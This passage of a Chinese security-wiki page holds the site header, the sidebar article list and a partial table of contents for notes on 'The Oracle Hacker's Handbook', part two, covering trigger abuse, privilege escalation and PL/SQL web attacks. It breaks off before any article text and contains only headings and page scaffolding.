<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    
    <title>The Oracle Hacker&#39;s Handbook: Hacking and Defending Oracle 下篇 | Tahir&#39;s Wiki</title>
    
    
        <meta name="keywords" content="Oracle Database">
    
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="description" content="The  Oracle Hacker’s Handbook: Hacking and Defending Oracle  by David  Litchfield John Wiley &amp; Sons 触发器（Triggers ）在 Oracle 中，触发器是执行某些任务并在给定事件发生时自动触发的 PL&#x2F;SQL 代码片段。可以为各种事件创建触发器，包括 DML 操作，如 INSERT、DE">
<meta property="og:type" content="article">
<meta property="og:title" content="The Oracle Hacker&#39;s Handbook: Hacking and Defending Oracle 下篇">
<meta property="og:url" content="http://example.com/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8B%E7%AF%87/index.html">
<meta property="og:site_name" content="Tahir&#39;s Wiki">
<meta property="og:description" content="The  Oracle Hacker’s Handbook: Hacking and Defending Oracle  by David  Litchfield John Wiley &amp; Sons 触发器（Triggers ）在 Oracle 中，触发器是执行某些任务并在给定事件发生时自动触发的 PL&#x2F;SQL 代码片段。可以为各种事件创建触发器，包括 DML 操作，如 INSERT、DE">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8B%E7%AF%87/8.png">
<meta property="og:image" content="http://example.com/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8B%E7%AF%87/9.png">
<meta property="og:image" content="http://example.com/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8B%E7%AF%87/10.png">
<meta property="article:published_time" content="2021-07-14T08:07:07.000Z">
<meta property="article:modified_time" content="2021-07-14T08:19:35.537Z">
<meta property="article:author" content="Tahir">
<meta property="article:tag" content="Oracle Database">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8B%E7%AF%87/8.png">
    

    
        <link rel="alternate" href="/atom.xml" title="Tahir&#39;s Wiki" type="application/atom+xml">
    

    
        <link rel="icon" href="/favicon.ico">
    

    
<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">

    
<link rel="stylesheet" href="/libs/open-sans/styles.css">

    
<link rel="stylesheet" href="/libs/source-code-pro/styles.css">


    
<link rel="stylesheet" href="/css/style.css">

    
<script src="/libs/jquery/2.1.3/jquery.min.js"></script>

    
<script src="/libs/jquery/plugins/cookie/1.4.1/jquery.cookie.js"></script>

    
    
        
<link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">

    
    
        
<link rel="stylesheet" href="/libs/justified-gallery/justifiedGallery.min.css">

    
    
    
    


    
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    
<meta name="generator" content="Hexo 5.4.0"></head>

<body>
    <div id="container">
        <header id="header">
    <div id="header-main" class="header-inner">
        <div class="outer">
            <a href="/" id="logo">
                <i class="logo"></i>
                <span class="site-title">Tahir&#39;s Wiki</span>
            </a>
            <nav id="main-nav">
                
                    <a class="main-nav-link" href="/">首页</a>
                
                    <a class="main-nav-link" href="/archives">归档</a>
                
                    <a class="main-nav-link" href="/categories">分类</a>
                
                    <a class="main-nav-link" href="/tags">标签</a>
                
                    <a class="main-nav-link" href="/about">关于</a>
                
            </nav>
            
            <div id="search-form-wrap">

    <form class="search-form">
        <input type="text" class="ins-search-input search-form-input" placeholder="Search">
        <button type="submit" class="search-form-submit"></button>
    </form>
    <div class="ins-search">
    <div class="ins-search-mask"></div>
    <div class="ins-search-container">
        <div class="ins-input-wrapper">
            <input type="text" class="ins-search-input" placeholder="Type something...">
            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
(function (window) {
    var INSIGHT_CONFIG = {
        TRANSLATION: {
            POSTS: 'Posts',
            PAGES: 'Pages',
            CATEGORIES: 'Categories',
            TAGS: 'Tags',
            UNTITLED: '(Untitled)',
        },
        ROOT_URL: '/',
        CONTENT_URL: '/content.json',
    };
    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
})(window);
</script>

<script src="/js/insight.js"></script>


</div>
        </div>
    </div>
    <div id="main-nav-mobile" class="header-sub header-inner">
        <table class="menu outer">
            <tr>
                
                    <td><a class="main-nav-link" href="/">首页</a></td>
                
                    <td><a class="main-nav-link" href="/archives">归档</a></td>
                
                    <td><a class="main-nav-link" href="/categories">分类</a></td>
                
                    <td><a class="main-nav-link" href="/tags">标签</a></td>
                
                    <td><a class="main-nav-link" href="/about">关于</a></td>
                
                <td>
                    
    <div class="search-form">
        <input type="text" class="ins-search-input search-form-input" placeholder="Search">
    </div>

                </td>
            </tr>
        </table>
    </div>
</header>

        <div class="outer">
            
            
                <aside id="sidebar">
   
        
    <div class="widget-wrap" id="categories">
        <h3 class="widget-title">
            <span>categories</span>
            &nbsp;
            <a id="allExpand" href="#">
                <i class="fa fa-angle-double-down fa-2x"></i>
            </a>
        </h3>
        
        
        
         <ul class="unstyled" id="tree"> 
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            1. 漏洞相关
                        </a>
                         <ul class="unstyled" id="tree"> 
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            MSSQL
                        </a>
                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/MSSQL/CVE-2020-0618-Microsoft-SQL-Server-Reporting-Services%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">CVE-2020-0618_SQL Server Reporting Services远程代码执行漏洞</a></li>  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/MSSQL/BID-23649-Microsoft-SQL-Server-%E6%95%B0%E6%8D%AE%E5%BA%93%E9%93%BE%E6%8E%A5%E7%88%AC%E7%BD%91%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">BID-23649_SQL Server链接爬网命令执行漏洞</a></li>  </ul> 
                    </li> 
                    
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            OpenSSL
                        </a>
                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/OpenSSL/CVE-2014-0224-OpenSSL%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%BC%8F%E6%B4%9E/">CVE-2014-0224_OpenSSL中间人漏洞</a></li>  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/OpenSSL/CVE-2014-0160-OpenSSL%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E/">CVE-2014-0160_OpenSSL心脏滴血漏洞</a></li>  </ul> 
                    </li> 
                    
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            Redis
                        </a>
                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/">Redis未授权访问漏洞</a></li>  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">Redis主从复制代码执行漏洞</a></li>  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2013-7458-Redis-redis-cli%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/">CVE-2013-7458_Redis redis-cli信息泄露漏洞</a></li>  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/">CVE-2015-4335_Redis EVAL Lua沙箱绕过漏洞</a></li>  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/">CVE-2015-8080_Redis getnum整数溢出漏洞</a></li>  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/">CVE-2016-8339_Redis缓冲区溢出漏洞</a></li>  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-10517-Redis%E8%B7%A8%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/">CVE-2016-10517_Redis跨协议漏洞</a></li>  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/">CVE-2017-15047_Redis数组索引越界漏洞</a></li>  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2018-11218-Redis-Lua%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/">CVE-2018-11218_Redis Lua缓冲区溢出漏洞</a></li>  </ul> 
                    </li> 
                     </ul> 
                    </li> 
                    
                    <li class="directory open">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder-open"></i>
                            &nbsp;
                            2. 数据库安全
                        </a>
                         <ul class="unstyled" id="tree"> 
                    <li class="directory open">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder-open"></i>
                            &nbsp;
                            Oracle Database
                        </a>
                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/">Oracle Database简单概述</a></li>  <li class="file"><a href="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-PLSQL%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86/">Oracle Database PL/SQL注入漏洞原理</a></li>  <li class="file"><a href="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/">Oracle Database 11g Wrap加密解密分析</a></li>  <li class="file"><a href="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8A%E7%AF%87/">The Oracle Hacker's Handbook: Hacking and Defending Oracle 上篇</a></li>  <li class="file active"><a href="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8B%E7%AF%87/">The Oracle Hacker's Handbook: Hacking and Defending Oracle 下篇</a></li>  </ul> 
                    </li> 
                    
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            SQL Server
                        </a>
                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/">SQL Server数据库攻防详解上篇</a></li>  <li class="file"><a href="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/">SQL Server数据库攻防详解下篇</a></li>  <li class="file"><a href="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/">SQL Server数据库安全加固</a></li>  </ul> 
                    </li> 
                     </ul> 
                    </li> 
                    
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            3. 应急响应
                        </a>
                         <ul class="unstyled" id="tree"> 
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            Linux应急响应
                        </a>
                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/3.%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">Linux应急响应</a></li>  </ul> 
                    </li> 
                    
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            Windows应急响应
                        </a>
                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/3.%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">Windows应急响应</a></li>  </ul> 
                    </li> 
                     </ul> 
                    </li> 
                    
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            4. 内网安全攻防
                        </a>
                         <ul class="unstyled" id="tree"> 
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            0-内网攻防基础
                        </a>
                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/0-%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/PowerShell%E5%9F%BA%E7%A1%80/">PowerShell基础</a></li>  <li class="file"><a href="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/0-%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/%E9%83%A8%E7%BD%B2%E5%9F%9F%E7%8E%AF%E5%A2%83/">部署域环境</a></li>  </ul> 
                    </li> 
                    
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            1-内网信息搜集
                        </a>
                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">主机信息搜集</a></li>  <li class="file"><a href="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">域信息搜集</a></li>  </ul> 
                    </li> 
                     </ul> 
                    </li> 
                    
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            5. 高级威胁猎捕
                        </a>
                         <ul class="unstyled" id="tree"> 
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            Cobalt Strike
                        </a>
                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/5.%20%E9%AB%98%E7%BA%A7%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/">0-Cobalt Strike零基础</a></li>  <li class="file"><a href="/wiki/5.%20%E9%AB%98%E7%BA%A7%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/">1-Cobalt Strike基础上篇</a></li>  <li class="file"><a href="/wiki/5.%20%E9%AB%98%E7%BA%A7%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/">1-Cobalt Strike基础中篇</a></li>  </ul> 
                    </li> 
                    
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            Defense Evasion
                        </a>
                         <ul class="unstyled" id="tree"> 
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            进程注入
                        </a>
                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/5.%20%E9%AB%98%E7%BA%A7%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Defense%20Evasion/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/Shellcode-APC%E6%B3%A8%E5%85%A5%E5%92%8C%E5%8A%A0%E8%BD%BD/">Shellcode APC注入和加载</a></li>  </ul> 
                    </li> 
                     </ul> 
                    </li> 
                     </ul> 
                    </li> 
                    
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            6. 威胁情报
                        </a>
                         <ul class="unstyled" id="tree"> 
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            APT情报
                        </a>
                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/6.%20%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/APT%E6%83%85%E6%8A%A5/%E7%9F%A5%E5%90%8DAPT%E7%BB%84%E7%BB%87%E6%A6%82%E8%BF%B0/">知名APT组织概述</a></li>  </ul> 
                    </li> 
                     </ul> 
                    </li> 
                    
                    <li class="directory">
                        <a href="#" data-role="directory">
                            <i class="fa fa-folder"></i>
                            &nbsp;
                            7. 学习资源
                        </a>
                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/7.%20%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90/">学习资源</a></li>  </ul> 
                    </li> 
                     <li class="file"><a href="/wiki/hello-world/">Hello World</a></li>  </ul> 
    </div>
    <script>
        $(document).ready(function() {
            var iconFolderOpenClass  = 'fa-folder-open';
            var iconFolderCloseClass = 'fa-folder';
            var iconAllExpandClass = 'fa-angle-double-down';
            var iconAllPackClass = 'fa-angle-double-up';
            // Handle directory-tree expansion:
            // 左键单独展开目录
            $(document).on('click', '#categories a[data-role="directory"]', function (event) {
                event.preventDefault();

                var icon = $(this).children('.fa');
                var expanded = icon.hasClass(iconFolderOpenClass);
                var subtree = $(this).siblings('ul');
                icon.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
                if (expanded) {
                    if (typeof subtree != 'undefined') {
                        subtree.slideUp({ duration: 100 });
                    }
                    icon.addClass(iconFolderCloseClass);
                } else {
                    if (typeof subtree != 'undefined') {
                        subtree.slideDown({ duration: 100 });
                    }
                    icon.addClass(iconFolderOpenClass);
                }
            });
            // 右键展开下属所有目录
            $('#categories a[data-role="directory"]').bind("contextmenu", function(event){
                event.preventDefault();
                
                var icon = $(this).children('.fa');
                var expanded = icon.hasClass(iconFolderOpenClass);
                var listNode = $(this).siblings('ul');
                var subtrees = $.merge(listNode.find('li ul'), listNode);
                var icons = $.merge(listNode.find('.fa'), icon);
                icons.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
                if(expanded) {
                    subtrees.slideUp({ duration: 100 });
                    icons.addClass(iconFolderCloseClass);
                } else {
                    subtrees.slideDown({ duration: 100 });
                    icons.addClass(iconFolderOpenClass);
                }
            })
            // 展开关闭所有目录按钮
            $(document).on('click', '#allExpand', function (event) {
                event.preventDefault();
                
                var icon = $(this).children('.fa');
                var expanded = icon.hasClass(iconAllExpandClass);
                icon.removeClass(iconAllExpandClass).removeClass(iconAllPackClass);
                if(expanded) {
                    $('#sidebar .fa.fa-folder').removeClass('fa-folder').addClass('fa-folder-open')
                    $('#categories li ul').slideDown({ duration: 100 });
                    icon.addClass(iconAllPackClass);
                } else {
                    $('#sidebar .fa.fa-folder-open').removeClass('fa-folder-open').addClass('fa-folder')
                    $('#categories li ul').slideUp({ duration: 100 });
                    icon.addClass(iconAllExpandClass);
                }
            });  
        });
    </script>

    
    <div id="toTop" class="fa fa-angle-up"></div>
</aside>
            
            <section id="main"><article id="post-2. 数据库安全/Oracle Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-下篇" class="article article-type-post" itemscope itemprop="blogPost">
    <div class="article-inner">
        
        
            <header class="article-header">
                
                    <div class="article-meta">
                        
    <div class="article-category">
    	<i class="fa fa-folder"></i>
        <a class="article-category-link" href="/categories/2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/">2. 数据库安全</a><i class="fa fa-angle-right"></i><a class="article-category-link" href="/categories/2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle-Database/">Oracle Database</a>
    </div>

                        
    <div class="article-tag">
        <i class="fa fa-tag"></i>
        <a class="tag-link-link" href="/tags/Oracle-Database/" rel="tag">Oracle Database</a>
    </div>

                        
    <div class="article-date">
        <i class="fa fa-calendar"></i>
        <a href="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8B%E7%AF%87/">
            <time datetime="2021-07-14T08:07:07.000Z" itemprop="datePublished">2021-07-14</time>
        </a>
    </div>


                        
                            <i class="fa fa-bar-chart"></i>
                            <span id="busuanzi_container_site_pv"><span id="busuanzi_value_page_pv"></span></span>    
                        
                        
                            <div class="article-meta-button">
                                <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/TahirMars/Wiki-site/raw/writing/source/_posts/2. 数据库安全/Oracle Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-下篇.md"> Source </a>
                            </div>
                            <div class="article-meta-button">
                                <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/TahirMars/Wiki-site/edit/writing/source/_posts/2. 数据库安全/Oracle Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-下篇.md"> Edit </a>
                            </div>
                            <div class="article-meta-button">
                                <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/TahirMars/Wiki-site/commits/writing/source/_posts/2. 数据库安全/Oracle Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-下篇.md"> History </a>
                            </div>
                        
                    </div>
                
                
    
        <h1 class="article-title" itemprop="name">
            The Oracle Hacker&#39;s Handbook: Hacking and Defending Oracle 下篇
        </h1>
    

            </header>
        
        
        <div class="article-entry" itemprop="articleBody">
        
        
            
                <div id="toc" class="toc-article">
                <strong class="toc-title">Catalogue</strong>
                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91%E5%99%A8%EF%BC%88Triggers-%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">触发器（Triggers ）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8MDSYS-SDO-GEOM-TRIG-INS1-%E5%92%8C-SDO-GEOM-TRIG-INS1%E8%A7%A6%E5%8F%91%E5%99%A8"><span class="toc-number">1.1.</span> <span class="toc-text">利用MDSYS.SDO_GEOM_TRIG_INS1 和 SDO_GEOM_TRIG_INS1触发器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8MDSYS-SDO-CMT-CBK-TRIG%E8%A7%A6%E5%8F%91%E5%99%A8"><span class="toc-number">1.2.</span> <span class="toc-text">利用MDSYS SDO_CMT_CBK_TRIG触发器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8SYS-CDC-DROP-CTABLE-BEFORE%E8%A7%A6%E5%8F%91%E5%99%A8"><span class="toc-number">1.3.</span> <span class="toc-text">利用SYS.CDC_DROP_CTABLE_BEFORE触发器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8MDSYS-SDO-DROP-USER-BEFORE%E8%A7%A6%E5%8F%91%E5%99%A8"><span class="toc-number">1.4.</span> <span class="toc-text">利用MDSYS.SDO_DROP_USER_BEFORE触发器</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%B4%E6%8E%A5%E7%89%B9%E6%9D%83%E6%8F%90%E5%8D%87"><span class="toc-number">2.</span> <span class="toc-text">间接特权提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8ECREATE-ANY-TRIGGER%E8%8E%B7%E5%8F%96DBA"><span class="toc-number">2.1.</span> <span class="toc-text">从CREATE ANY TRIGGER获取DBA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8ECREATE-ANY-VIEW%E8%8E%B7%E5%8F%96DBA"><span class="toc-number">2.2.</span> <span class="toc-text">从CREATE ANY VIEW获取DBA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8EEXECUTE-ANY-PROCEDURE%E8%8E%B7%E5%8F%96DBA"><span class="toc-number">2.3.</span> <span class="toc-text">从EXECUTE ANY PROCEDURE获取DBA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8ECREATE-PROCEDURE%E8%8E%B7%E5%8F%96DBA"><span class="toc-number">2.4.</span> <span class="toc-text">从CREATE PROCEDURE获取DBA</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%99%9A%E6%8B%9F%E4%B8%93%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">3.</span> <span class="toc-text">攻击虚拟专用数据库</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AC%BA%E9%AA%97-Oracle-%E5%88%A0%E9%99%A4%E7%AD%96%E7%95%A5"><span class="toc-number">3.1.</span> <span class="toc-text">欺骗 Oracle 删除策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%8E%9F%E5%A7%8B%E6%96%87%E4%BB%B6%E8%AE%BF%E9%97%AE%E6%94%BB%E5%87%BBVPD"><span class="toc-number">3.2.</span> <span class="toc-text">使用原始文件访问攻击VPD</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E8%88%AC%E7%89%B9%E6%9D%83"><span class="toc-number">3.3.</span> <span class="toc-text">一般特权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BBOracle-PL-SQL-Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F"><span class="toc-number">4.</span> <span class="toc-text">攻击Oracle PL&#x2F;SQL Web应用程序</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A4%E8%AF%86Oracle-PL-SQL%E7%BD%91%E5%85%B3"><span class="toc-number">4.1.</span> <span class="toc-text">认识Oracle PL&#x2F;SQL网关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 